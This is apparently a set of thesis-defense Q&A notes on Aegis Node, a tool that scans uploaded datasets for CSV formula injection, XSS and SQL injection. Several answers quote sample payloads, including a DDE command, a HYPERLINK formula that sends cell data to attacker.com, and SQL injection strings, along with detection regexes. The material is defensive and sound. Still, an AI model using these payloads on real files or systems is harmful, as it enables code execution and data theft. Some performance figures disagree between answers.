# Aegis Node — M.Tech Defense Viva Questions & Answers

This document contains 42 comprehensive, technically rigorous viva defense questions and model answers covering all aspects of Aegis Node.

---

## 1. Basic & Fundamental Questions

### Q1: What is Aegis Node and what core problem does it solve?
**Answer**: Aegis Node is an AI-assisted multi-stage framework for secure dataset threat detection, remediation, and verification. It solves the dataset content security gap: data ingestion pipelines frequently ingest CSV, JSON, and Parquet files carrying embedded application-layer payloads (spreadsheet formula injection, XSS script tags, SQL injection fragments) that bypass network firewalls and execute inside analyst tools or downstream database queries.

### Q2: Who are the target users of this system?
**Answer**: Data engineering teams, cybersecurity operations centers (SOC), automated machine learning (AutoML) ingestion pipelines, enterprise data warehousing teams, and financial institutions ingesting third-party bulk tabular datasets.

### Q3: What dataset formats does Aegis Node support?
**Answer**: CSV (`.csv`), JSON (`.json`), JSON Lines (`.jsonl`), and Apache Parquet (`.parquet`).

### Q4: Why is dataset security distinct from network security or IAM?
**Answer**: TLS protects data in transit, while IAM/S3 policies restrict file access permissions. However, neither network encryption nor access control inspects file *content*. An authorized user can upload a valid CSV file containing `=CMD("calc.exe")`, which passes network and storage security unharmed but compromises the analyst's machine upon opening.

### Q5: What are the primary deliverables of this research project?
**Answer**:
1. A multi-stage threat detection engine combining ClamAV with a format-aware rule inspector.
2. A privacy-preserving LLM evidence-reasoning service powered by Gemini 3.6 Flash.
3. A deterministic format-aware dataset sanitizer with verification re-scanning.
4. A React 18 UI dashboard for real-time visualization and sanitized file download.
5. A reproducible 100-dataset synthetic benchmark evaluation framework.

---

## 2. Architecture & Technology Stack

### Q6: Why was FastAPI chosen for the backend instead of Flask or Django?
**Answer**: FastAPI provides asynchronous I/O (`async`/`await`), native Pydantic schema validation, automatic OpenAPI document generation (`/docs`), and extreme execution speed comparable to Node.js and Go. This enables microsecond API routing for inline dataset scanning.

### Q7: Why use SQLite for the database instead of PostgreSQL?
**Answer**: Aegis Node prioritizes a lightweight, zero-configuration local deployment footprint for demonstration and single-node deployment. SQLite provides ACID-compliant file-based persistence via SQLAlchemy 2.0 without requiring external database server administration.

### Q8: How is ClamAV integrated into Aegis Node?
**Answer**: ClamAV runs as a Docker container (`clamav/clamav:stable`). Aegis Node connects over a TCP socket (`127.0.0.1:3310`) using the `INSTREAM` protocol, streaming dataset bytes in 4 KB chunks without saving temporary files inside the container.

### Q9: Why is React 18 with Vite used for the frontend?
**Answer**: Vite provides instant hot-module replacement (HMR) and fast production builds (~900 ms). React 18's component architecture enables a clean state machine managing Upload, Scanning, AI Analysis, Remediation, and History views.

### Q10: What is the role of `docker-compose.yml` in this project?
**Answer**: It orchestrates the ClamAV daemon container, configuring named volumes (`clamav_db`) for virus signature persistence, memory/scan limits (100 MB caps), health checks (`clamdscan --ping`), and restricting network binding strictly to `127.0.0.1:3310`.

### Q11: How does the system achieve high scanning throughput?
**Answer**: Stage 2 rule checking uses compiled Python regular expressions operating directly on pandas DataFrame string columns capped at 10,000 rows. This achieves an average scan latency of 1.22 ms per dataset (821 datasets/sec).

---

## 3. Security & Privacy Controls

### Q12: How is path traversal prevented during file upload and download?
**Answer**: Files are assigned random 128-bit UUID names (`data/samples/{uuid}.csv`). User-supplied filenames are sanitized by stripping path separators (`/`, `\`, `\0`). `FileService` methods use `Path.resolve()` to verify that resolved target paths strictly reside within allowed `data/samples/`, `data/quarantine/`, or `data/sanitized/` directory boundaries.

### Q13: How are uploaded files prevented from executing code on the server?
**Answer**: Uploaded files are treated as untrusted data bytes. They are read exclusively through data parsing libraries (`pandas.read_csv`, `json.load`, `pyarrow`). **Zero `eval()`, `exec()`, or subshell invocation (`os.system`, `subprocess`) is ever executed on dataset content.**

### Q14: How does Aegis Node guarantee original file immutability?
**Answer**: Files stored in `data/samples/` and `data/quarantine/` are strictly read-only. The remediation engine never modifies original files; sanitized outputs are written exclusively to `data/sanitized/` under a new UUID filename and distinct SHA-256 hash.

### Q15: Where is the Gemini API key stored, and how is secret leakage prevented?
**Answer**: The `GEMINI_API_KEY` resides exclusively in the backend `.env` file. It is read into memory via `backend/config.py` and is never returned in API responses, rendered in frontend JavaScript, or committed to Git (`.gitignore` excludes `.env`).

### Q16: Why is the ClamAV Docker port restricted to `127.0.0.1:3310`?
**Answer**: Binding to `0.0.0.0:3310` would expose the unauthenticated ClamAV daemon socket to the local network, allowing remote attackers to send malicious streams or consume daemon CPU resources. Binding to `127.0.0.1` ensures only the local Aegis Node backend can communicate with it.

### Q17: What file upload limits are enforced?
**Answer**: A strict extension whitelist (`.csv`, `.json`, `.jsonl`, `.parquet`) blocks executable extensions (`.py`, `.sh`, `.exe`). A hard file size cap of 100 MB is enforced before reading bytes into memory.

### Q18: What is quarantine and when is a file quarantined?
**Answer**: If ClamAV detects a virus or if content checking finds a `critical` severity payload (e.g., `<script>` tag or DDE execution command), the file is moved from `data/samples/` to `data/quarantine/` to prevent analysts from accidentally opening it.

---

## 4. Artificial Intelligence & LLM Integration

### Q19: Which LLM model is used, and why?
**Answer**: Google's `gemini-3.6-flash` via the official `google-genai` SDK v2. It was selected for its fast inference latency, low API token cost, and structured output support.

### Q20: What is the "Evidence Minimization" protocol?
**Answer**: Instead of sending raw dataset files, full database tables, or raw file bytes to Gemini, Aegis Node extracts only compact rule finding dictionaries (rule ID, severity, category, description, line location). This prevents privacy leakage of sensitive user data to external AI APIs.

### Q21: Is the LLM the primary threat detector?
**Answer**: **No.** Deterministic rules and ClamAV handle 100% of detection and remediation. The LLM acts purely as an analysis assistant, synthesizing scanner findings to provide human-readable threat summaries, confidence scores, and remediation advice.

### Q22: How is prompt injection prevented when sending findings to the LLM?
**Answer**:
1. Untrusted raw dataset text is excluded from prompt inputs.
2. System instructions enforce strict role boundaries.
3. Tool/function calling is completely disabled.
4. Output is validated against a Pydantic schema (`LlmAnalysisOutput`), rejecting malformed LLM responses.

### Q23: What happens if Gemini API is offline or the API key is missing?
**Answer**: Aegis Node degrades gracefully. The scanner engine completes all detection and remediation workflows normally, returning a clean response with an `"AI Analysis Unavailable"` message without crashing.

### Q24: How does Pydantic enforce LLM response structure?
**Answer**: The LLM API call uses Gemini's `response_schema` parameter typed to `LlmAnalysisOutput`. FastAPI validates the JSON output fields (`verdict`, `severity`, `confidence_score`, `summary`, `recommendations`) before returning it to the frontend.

---

## 5. Detection Engine & Rules

### Q25: How does CSV Formula Injection work?
**Answer**: Spreadsheet software (Microsoft Excel, LibreOffice, Google Sheets) interprets cell strings beginning with `=`, `+`, `-`, `@`, or `|` as executable formulas. Attackers embed DDE commands (`=CMD("calc.exe")`) or hyperlinked exfiltration formulas (`=HYPERLINK("http://attacker.com?data="&A1)`), executing code when an analyst opens the exported CSV.

### Q26: What regular expression rules are implemented in `scanner/content_checker.py`?
**Answer**:
- `FORM-001`: Formula trigger character (`^\s*[=+\-@|]`).
- `FORM-002`: DDE command payload (`DDE\(`, `cmd\|`, `powershell\|`).
- `FORM-003`: External hyperlink formula (`HYPERLINK\(`).
- `SCRP-001`: HTML script tag (`<\s*script`).
- `SCRP-002`: `javascript:` protocol handler.
- `SCRP-003`: `eval()` or `exec()` call.
- `SQLI-001`: Classic SQL injection (`'\s*OR\s*'1'\s*=\s*'1`, `; DROP TABLE`).
- `SQLI-002`: `UNION SELECT` injection.
- `BIN-001`: Null byte control character (`\x00`).

### Q27: How is the composite risk score calculated?
**Answer**: Severity weights ($w(\text{critical})=3.5, w(\text{high})=2.0, w(\text{medium})=1.0, w(\text{low})=0.3$) are summed across findings. If ClamAV detects infection, +5.0 is added. The final score is capped at 10.0.

### Q28: Why inspect only the first 10,000 rows of a dataset?
**Answer**: Bounding row inspection caps memory consumption and guarantees predictable scan latency (< 2 ms) for inline HTTP processing.

### Q29: What is the difference between ClamAV scanning and static rule checking?
**Answer**: ClamAV streams raw binary bytes to match virus signatures (e.g., EICAR test file). Rule checking parses structured CSV/JSON text to detect syntactic injection attacks that ClamAV ignores.

---

## 6. Remediation & Re-Scan Verification

### Q30: How does single-quote formula escaping remediate CSV formula injection?
**Answer**: Prefixing formula cell strings with a single quote (`'=CMD("calc.exe")`) instructs Excel to treat the cell as plain text. The formula trigger character is neutralized, preventing DDE execution upon file opening.

### Q31: How are script tags and SQL payloads remediated?
**Answer**: Script tags (`<script>`) are converted to `[script_removed]`. SQL injection strings (`' OR '1'='1`) are converted to `[sql_payload_neutralized]`.

### Q32: What is an automated verification re-scan?
**Answer**: Immediately after the sanitizer generates a sanitized file artifact in `data/sanitized/`, Aegis Node automatically executes `run_scan()` on the sanitized artifact. This computes the sanitized risk score and remaining findings count.

### Q33: How is Threat Reduction Percentage calculated?
**Answer**:
$$\text{Threat Reduction \%} = \frac{\text{Risk}_{\text{orig}} - \text{Risk}_{\text{san}}}{\text{Risk}_{\text{orig}}} \times 100\%$$

### Q34: What is the difference between `completed` and `partial` remediation status?
**Answer**: Status is `completed` if the verification re-scan reports zero remaining threat findings (`remaining_findings_count == 0`). Status is `partial` if remaining findings exist.

---

## 7. Research Evaluation & Benchmarking

### Q35: How was the 100-dataset synthetic benchmark corpus constructed?
**Answer**: `evaluation/dataset_generator.py` deterministically created 5 categories (20 datasets each): clean, formula injection, script injection, SQL injection, and mixed threats, saved along with an independent `ground_truth.json` label map.

### Q36: What detection modes were benchmarked?
**Answer**: `rule_only`, `clamav_only`, `combined` (Rules + ClamAV), and `combined_llm` (Rules + ClamAV + Gemini).

### Q37: What were the quantitative evaluation results?
**Answer**:
- **F1 Score**: 1.0000 (Rule-only & Combined modes).
- **Mean Scan Latency**: 1.73 ms per dataset (577.8 datasets/sec throughput).
- **Average Threat Reduction**: 79.41%.
- **Remediation Success Rate**: 66.25% (53 of 80 threat datasets 100% clean).

### Q38: Why express benchmark results with academic disclaimers?
**Answer**: The 1.0000 F1 score reflects observed performance on the defined 100-dataset synthetic benchmark corpus under controlled test conditions. Stating "100% real-world detection accuracy" would be scientifically dishonest because real-world zero-day obfuscation differs from synthetic test templates.

---

## 8. Critical & Defense Challenge Questions

### Q39: Can an attacker bypass single-quote formula escaping?
**Answer**: If an analyst explicitly removes the leading single quote or converts cell formatting manually, the formula could re-activate. However, single-quote prefixing is the official OWASP-recommended mitigation standard for CSV injection.

### Q40: What happens if an attacker obfuscates SQL payloads using hexadecimal encoding?
**Answer**: Advanced obfuscation can bypass fixed regular expressions. Aegis Node addresses this limitation by using static rules as a fast inline filter while delegating complex reasoning to LLM contextual analysis and allowing future YARA signature integration.

### Q41: Why not use PostgreSQL, Redis, and Celery instead of SQLite and synchronous FastAPI calls?
**Answer**: Aegis Node is designed as a demonstrable, lightweight M.Tech research system. Adding PostgreSQL, Redis, Celery, or Kafka introduces heavy DevOps setup overhead without improving the core research contribution (detection accuracy, AI evidence minimization, remediation verification).

### Q42: What makes Aegis Node defensible as an M.Tech CSE/Cybersecurity thesis?
**Answer**: It addresses a novel data ingestion security problem, implements a multi-stage hybrid detection architecture, enforces privacy-preserving AI evidence minimization, provides deterministic threat remediation with quantitative re-scan metrics, and validates claims through an empirical 100-dataset benchmark suite.
